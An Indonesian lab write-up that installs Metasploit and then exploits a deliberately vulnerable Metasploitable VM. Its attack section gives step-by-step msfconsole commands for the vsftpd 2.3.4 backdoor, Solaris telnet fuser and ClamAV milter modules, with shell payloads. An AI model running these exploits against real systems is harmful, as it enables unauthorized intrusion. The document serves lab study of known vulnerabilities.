#A. Pendahuluan

Metasploit merupakan sofware security yang sering digunakan untuk menguji coba ketahanan suatu sistem dengan cara mengeksploitasi kelemahan software suatu sistem. Metasploit diciptakan oleh HD Moore pada tahun 2003 sebagai sebuah alat jaringan portabel menggunakan bahasa scripting Perl. Kemudian, Metasploit Framework benar-benar ditulis ulang dalam bahasa pemrograman Ruby. Pada tanggal 21 Oktober 2009, Proyek Metasploit mengumumkan yang telah diakuisisi oleh Rapid7, sebuah perusahaan keamanan yang menyediakan solusi kerentanan manajemen terpadu.

Seperti produk komersial yang sebanding seperti kanvas Imunitas atau Inti Dampak Core Security Technologies, Metasploit dapat digunakan untuk menguji kerentanan sistem komputer untuk melindungi mereka atau untuk masuk ke sistem remote. Seperti alat-alat keamanan banyak informasi, Metasploit dapat digunakan untuk kegiatan baik yang sah dan tidak sah. Sejak akuisisi dari Metasploit Framework.

Metasploit biasanya digunakan untuk menyerang application layer dengan 0 day attack yang merupakan metode penyerangan pada software yang belum di patch. Metasploit biasa dikaitkan dengan istilah remote exploitation, maksudnya penyerang berada pada jarak jangkauan yang jauh dapat mengendalikan komputer korban. Metasploit menyerang dengan cara mengirimkan exploit pada komputer korban. Exploit ini berisi payload yang sudah ditentukan oleh penyerang. Exploit adalah software yang berfungsi untuk memanfaatkan kelemahan pada software korban(misal web browser), setelah berhasil mengeksploitasinya exploit tersebut memasukkan payload ke dalam memori korban.

Payload merupakan sebuah executable milik penyerang yang akan di run pada komputer korban dengan tujuan dapat mengendalikan komputer tersebut secara remote atau memasang backdoor, trojan, virus, worm, dan lain-lain. Terlepas dari penggunaan metasploit yang disalah gunakan untuk kejahatan, software ini juga membantu System Security untuk memperkuat pertahanan jaringannya dari ulah penyerang dari luar.

#B. Dasar Teori
1. VMWare Workstation
   
   VMWare Workstation adalah software untuk virtual machine yang compatible dengan komputer Intel x86. Software ini memungkinkan pemakai untuk membuat satu atau lebih virtual machine dan menjalankannya secara serempak. Masing-masing virtual machine dapat menjalankan guest operating system-nya sendiri seperti Linux, Windows, BSD, dan lain-lain. Tetapi software ini tidak dapat menjalankan virtual machine yang dibuat oleh produk VMWare yang lain.
   
2. Kali Linux

   Kali Linux adalah salah satu distribusi Linux tingkat lanjut untuk Penetration Testing dan audit keamanan. Distro ini dulunya adalah distro Backtrack, yang kemudian memutuskan mengganti nama distronya tersebut menjadi Kali Linux di versi terbarunya. Kali Linux ini akan dijadikan sebagai standarisasi distro Linux yang digunakan untuk percobaan penetrasi.
  
3. Linux Ubuntu 16.04 LTS

	Ubuntu adalah [sistem operasi] lengkap berbasis Linux, tersedia secara bebas dan mempunyai dukungan baik yang berasal dari komunitas maupun tenaga ahli profesional. Komunitas Ubuntu dibentuk berdasarkan gagasan yang terdapat di dalam filosofi Ubuntu:
    * bahwa perangkat lunak harus tersedia dengan bebas biaya
    * bahwa aplikasi perangkat lunak tersebut harus dapat digunakan dalam bahasa lokal masing-masing dan untuk orang-orang yang mempunyai keterbatasan fisik, dan
    * bahwa pengguna harus mempunyai kebebasan untuk mengubah perangkat lunak sesuai dengan apa yang mereka butuhkan.
	Perihal kebebasan inilah yang membuat Ubuntu berbeda dari perangkat lunak berpemilik (proprietary); bukan hanya peralatan yang Anda butuhkan tersedia secara bebas biaya, tetapi Anda juga mempunyai hak untuk memodifikasi perangkat lunak Anda sampai perangkat lunak tersebut bekerja sesuai dengan yang Anda inginkan.

	Nama Ubuntu diambil dari nama sebuah konsep ideologi di Afrika Selatan. “Ubuntu” berasal dari bahasa kuno Afrika, yang berarti “rasa perikemanusian terhadap sesama manusia”. Ubuntu juga bisa berarti “aku adalah aku karena keberadaan kita semua”. Tujuan dari distribusi Linux Ubuntu adalah membawa semangat yang terkandung di dalam Ubuntu ke dalam dunia perangkat lunak.

4. VSFTPD_234_BACKDOOR
	vsftpd adalah modul exploit yang bermalware digunakan untuk menjadi sebuah backdoor yang disisipkan pada archive download VSFTPD. Backdoor ini dimasukkan ke dalam vsftpd-2.3.4.tar.gz antara 30 Juni 2011 sampai dengan 1 Juli 2011 menurut informasi yang ada. Backdoor ini dihapus pada 3 Juli 2011.

5. Fuser Solaris Telnet
	Modul ini mengeksploit vulnerability dari sebuah injeksi argumen pada daemon telnet dari Solaris 10 dan 11.

6. ClamAV Milter Blackhole-Mode Remote Code Execution
Modul ini mengeksploit kekurangan pada Clam Antivirus (Sendmail mail filter). Versi sebelum v0.92.2 sangatlah mudah diserang. Ketika diimplementasikan dengan mode black hole yang menyala, memungkinkan untuk mengeksekusi perintah secara remote akibat kurang amannya pemanggilan popen.

#C. Instalasi
## C.1 Instalasi Metasploit
### C.1.1 Instalasi Metasploit pada Ubuntu 16.04
Pada Ubuntu belum terinstall secara langsung metasploit framework, sehingga diperlukan secara manual instalasi aplikasi metasploit framework didalam ubuntu 16.04 dengan cara sebagai berikut 

1. Install Oracle Java 8
Tambahkan repository Oracle Java
```
sudo add-apt-repository -y ppa:webupd8team/java
```
[![1.png](https://s30.postimg.org/95150sxa9/image.png)](https://postimg.org/image/i01zbbm2l/)
[![2.png](https://s30.postimg.org/xa1uiihkx/image.png)](https://postimg.org/image/47nkfovb1/)
Update Ubuntu
```
sudo apt-get update
```
[![3.png](https://s30.postimg.org/p5tqdrv5t/image.png)](https://postimg.org/image/rn5hl1f25/)
Install Java-8
```
sudo apt-get -y install oracle-java8-installer
```
[![4.png](https://s30.postimg.org/4n3fmg6m9/image.png)](https://postimg.org/image/m0dq1b1x9/)

2. Install Dependencies
Install dependencies yang dibutuhkan dalam menjalankan metasploit
```
sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev vncviewer libyaml-dev curl zlib1g-dev
```
[![5.png](https://s30.postimg.org/4oddfv8g1/image.png)](https://postimg.org/image/rd2kffptp/)

3. Install Ruby
Install Ruby dengan menggunakan rbenv
```
cd ~
git clone git://github.com/sstephenson/rbenv.git .rbenv
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(rbenv init -)"' >> ~/.bashrc
exec $SHELL
```
```
git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
echo 'export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"' >> ~/.bashrc
```
```
git clone git://github.com/dcarley/rbenv-sudo.git ~/.rbenv/plugins/rbenv-sudo
```
```
exec $SHELL
```
```
RUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version -q -O - )
rbenv install $RUBYVERSION
rbenv global $RUBYVERSION
ruby -v
```

4. Install Nmap
Installasi Nmap untuk melihat aplikasi serta versi dari port yang terbuka sehingga bisa dilakukan exploit
```
mkdir ~/Development
cd ~/Development
git clone https://github.com/nmap/nmap.git
cd nmap 
./configure
make
sudo make install
make clean
```

5. Konfigurasi PostgreSQL
Ganti menjadi user postgre agar dapat membuat database
```
sudo -s
su postgres
```
Lalu buat databae
```
createuser msf -P -S -R -D
createdb -O msf msf
exit
exit
```

6. Install Metasploit Framework
Download metasploit framework terlebih dahulu
```
cd /opt
sudo git clone https://github.com/rapid7/metasploit-framework.git
sudo chown -R `whoami` /opt/metasploit-framework
cd metasploit-framework
```
Install menggunakan bundler dan gems yang dibutuhkan
```
gem install bundler
bundle install
```
Setting supaya bisa diakses oleh semua user
```
sudo bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
```

7. Metasploit for Development and Contribution
Apabila ingin berkontribusi ke dalam pengembangan metasploit lakukan langkah dibawah ini
```
curl -# -o /tmp/armitage.tgz http://www.fastandeasyhacking.com/download/armitage150813.tgz
sudo tar -xvzf /tmp/armitage.tgz -C /opt
sudo ln -s /opt/armitage/armitage /usr/local/bin/armitage
sudo ln -s /opt/armitage/teamserver /usr/local/bin/teamserver
sudo sh -c "echo java -jar /opt/armitage/armitage.jar \$\* > /opt/armitage/armitage"
sudo perl -pi -e 's/armitage.jar/\/opt\/armitage\/armitage.jar/g' /opt/armitage/teamserver
```
Buatlah konfigurasi database
```
sudo nano /opt/metasploit-framework/config/database.yml
```
Dengan berisi
```
production:
 adapter: postgresql
 database: msf
 username: msf
 password: 
 host: 127.0.0.1
 port: 5432
 pool: 75
 timeout: 5
```
```
sudo sh -c "echo export MSF_DATABASE_CONFIG=/opt/metasploit-framework/config/database.yml >> /etc/profile"
source /etc/profile
```

8. Jalankan msfconsole
Setelah selesai seluruh konfigurasi, terakhir adalah menjalankan console metasploit dengan command
```
msfconsole
```
[![11.png](https://s30.postimg.org/5yb6ux281/image.png)](https://postimg.org/image/coro4cpdp/)

###C.1.2 Installasi metasploit pada Kali Linux
####C.1.2.1 Installasi metasploit pada Kali Linux sebelum 2016 Rolling Edition
Untuk menjalankan metasploit pada Kali Linux versi sebelum 2016.01 Rolling Edition diperlukan 3 hal yaitu

1. Start Kali PostgreSQL Service
```
service postgresql start
```

2. Start Kali Metasploit Service
```
service metasploit start
```

3. Start msfconsole
```
msfconsole
```
Maka Hasilnya akan seperti dibawah ini

####C.1.2.2 Instalasi Metasploit pada Kali Linux 2016.01 Rolling Edition
Untuk menjalankan metasploit pada kali linux 2016.01 Rolling Edition tinggal menjalankan aplikassi msf framework maka akan langsung jalan aplikasi msf metasploit
[![12.png](https://s30.postimg.org/4kjjzm2yp/image.png)](https://postimg.org/image/q6ykgn1j1/)

## C.2 Installasi Metasploitable
Untuk menjalankan metasploitable kita harus mendownloadnya terlebih dahulu di
https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Setelah selesai di unzip buka VMWare Workstation dan Open Virtual Machine 
[![6.png](https://s30.postimg.org/4qx92pc3l/image.png)](https://postimg.org/image/q0kvdjse5/)
Lalu arahkan kepada folder tenmpat penyimpanan metasploitable
[![7.png](https://s30.postimg.org/q1ut6yu81/image.png)](https://postimg.org/image/ecqtj0399/)
Jalankan Machine Virtualnya
[![8.png](https://s30.postimg.org/w42fxgio1/image.png)](https://postimg.org/image/r5exixev1/)
Untuk login gunakan username serta password msfadmin
[![9.png](https://s30.postimg.org/8ed08rkap/image.png)](https://postimg.org/image/dd0inao3h/)
#D. Attack Exploit
##D.1 Exploit menggunakan vsftpd_234_backdoor
Langkah pertama yang dilakukan adalah mengecek metasploitable apakah dapat dilakukan exploit dengan menggunakan vsftpd_234_backdoor dengan command
```
nmap -sV "Target IP"
```
[![14.png](https://s30.postimg.org/uu9ofiv7l/image.png)](https://postimg.org/image/amw8n7xq5/)
Apabila Target memiliki service yang terbuka dengan menggunakan versi vsftpd 2.3.4 maka exploit dapat dilakukan

Langkah selanjutnya yang dilakukan adalah buka aplikasi msfconsole
[![12.png](https://s30.postimg.org/4kjjzm2yp/image.png)](https://postimg.org/image/q6ykgn1j1/)
Tampilan akan seperti dibawah ini
[![13.png](https://s30.postimg.org/3wapgo48x/image.png)](https://postimg.org/image/e6d4fwu4d/)
Masukkan command dibawah untuk mulai menggunakan exploit
```
use exploit/unix/ftp/vsftpd_234_backdoor
```
[![17.png](https://s30.postimg.org/6ucq7hi81/image.png)](https://postimg.org/image/4d0z07ybh/)
Set target ip serta payload yang akan digunakan
```
set RHOST localhost
set PAYLOAD cmd/unix/interact
```
[![18.png](https://s30.postimg.org/m4cleodq9/image.png)](https://postimg.org/image/jn0u7ettp/)
[![19.png](https://s30.postimg.org/ghg8h7b7l/image.png)](https://postimg.org/image/bvk48upod/)
Setelah mengatur ip target dan payload yang akan digunakan selanjutnya dilakukan exploit
```
exploit
```
[![20.png](https://s30.postimg.org/fgfzs2u81/image.png)](https://postimg.org/image/g5ys4furh/)
Apabila tampilan diatas telah muncul, maka host berhasil ditembus

Melakukan pengecekan ip host dan ternyata sama
[![21.png](https://s30.postimg.org/9tjmulrpd/image.png)](https://postimg.org/image/m86euxj7h/)
Melakukan pengecekan service yang terdapat pada host
[![22.png](https://s30.postimg.org/58xgfo801/image.png)](https://postimg.org/image/e3yaq6wsd/)
Cek uname -a dari host
[![23.png](https://s30.postimg.org/t16rr7a0x/image.png)](https://postimg.org/image/maqahrmv1/)
##D.2 Exploit menggunakan fuser
Langkah pertama yang dilakukan adalah mengecek metasploitable apakah dapat dilakukan exploit dengan menggunakan fuser dengan command
```
nmap -sV "Target IP"
```
[![15.png](https://s30.postimg.org/h1v9jw4g1/image.png)](https://postimg.org/image/lazzm27p9/)
Apabila Target memiliki service yang telnet terbuka maka exploit dapat dilakukan

Langkah selanjutnya yang dilakukan adalah buka aplikasi msfconsole
[![12.png](https://s30.postimg.org/4kjjzm2yp/image.png)](https://postimg.org/image/q6ykgn1j1/)
Tampilan akan seperti dibawah ini
[![13.png](https://s30.postimg.org/3wapgo48x/image.png)](https://postimg.org/image/e6d4fwu4d/)
Masukkan command dibawah untuk mulai menggunakan exploit
```
use exploit/solaris/telnet/fuser
```
[![24.png](https://s30.postimg.org/wyymucm81/image.png)](https://postimg.org/image/j5aa5atml/)
Set target ip, port, user serta payload yang akan digunakan
```
set RHOST localhost
set RPORT 23
set USER bin
set PAYLOAD cmd/unix/bind_perl
```
[![25.png](https://s30.postimg.org/e7wpk6rnl/image.png)](https://postimg.org/image/k8ueh9e9p/)
Setelah mengatur ip target dan payload yang akan digunakan selanjutnya dilakukan exploit
```
exploit
```
[![26.png](https://s30.postimg.org/6gfzlmni9/image.png)](https://postimg.org/image/d6wgv2anx/)
Apabila tampilan diatas telah muncul, maka host berhasil ditembus

Melakukan pengecekan ip host dan ternyata sama
[![21.png](https://s30.postimg.org/9tjmulrpd/image.png)](https://postimg.org/image/m86euxj7h/)
Melakukan pengecekan service yang terdapat pada host
[![22.png](https://s30.postimg.org/58xgfo801/image.png)](https://postimg.org/image/e3yaq6wsd/)
Cek uname -a dari host
[![23.png](https://s30.postimg.org/t16rr7a0x/image.png)](https://postimg.org/image/maqahrmv1/)
##D.3 Exploit menggunakan clamav_milter_blackhole
Langkah pertama yang dilakukan adalah mengecek metasploitable apakah dapat dilakukan exploit dengan menggunakan clamav_milter_blackhole dengan command
```
nmap -sV "Target IP"
```
[![16.png](https://s30.postimg.org/ii6s217cx/image.png)](https://postimg.org/image/8xn5f5i0t/)
Apabila Target memiliki service smtp terbuka maka exploit dapat dilakukan

Langkah selanjutnya yang dilakukan adalah buka aplikasi msfconsole
[![12.png](https://s30.postimg.org/4kjjzm2yp/image.png)](https://postimg.org/image/q6ykgn1j1/)
Tampilan akan seperti dibawah ini
[![13.png](https://s30.postimg.org/3wapgo48x/image.png)](https://postimg.org/image/e6d4fwu4d/)
Masukkan command dibawah untuk mulai menggunakan exploit
```
use exploit/unix/smtp/clamav_milter_blackhole
```
[![27.png](https://s30.postimg.org/n5hfhjk3l/image.png)](https://postimg.org/image/hu2iwty0t/)
Set target ip, port, user serta payload yang akan digunakan
```
set RHOST 192.168.1.6
set RPORT 25
set PAYLOAD cmd/unix/bind_perl
```
[![28.png](https://s30.postimg.org/9d30lwtc1/image.png)](https://postimg.org/image/41o417799/)
Setelah mengatur ip target dan payload yang akan digunakan selanjutnya dilakukan exploit
```
exploit
```
[![29.png](https://s30.postimg.org/4sgu6z9mp/image.png)](https://postimg.org/image/vdjd2jbzx/)
Apabila tampilan diatas telah muncul, maka host berhasil ditembus

Melakukan pengecekan ip host dan ternyata sama
[![21.png](https://s30.postimg.org/9tjmulrpd/image.png)](https://postimg.org/image/m86euxj7h/)
Melakukan pengecekan service yang terdapat pada host
[![22.png](https://s30.postimg.org/58xgfo801/image.png)](https://postimg.org/image/e3yaq6wsd/)
Cek uname -a dari host
[![23.png](https://s30.postimg.org/t16rr7a0x/image.png)](https://postimg.org/image/maqahrmv1/)
#E. Kesimpulan dan Saran
Dengan menggunakan Kali Linux sangatlah mudah untuk mengeksploitasi sebuah sistem yang memiliki banyak celah untuk dilakukan penyerangan. Dikarenakan pada Kali Linux 2016.01 sudah terinstall aplikasi metasploit, sehingga tidak perlu lagi melakukan pengaturan dan penginstalan modul-modul yang diperlukan untuk menjalankan aplikasi metasploit. Dengan meggunakan exploit vsftpd_234_backdoor, fuser, serta clamav_milter_blackhole, metasploitable dapat dibuka sessionnya sehingga dapat dilakukan penyerangan dengan sangat mudah. Untuk menanggulangi hal-hal seperti diatas pengguna diharapkan selalu melakukan pembaharuan perangkat lunak sehingga celah-celah yang ada dapat dihindari.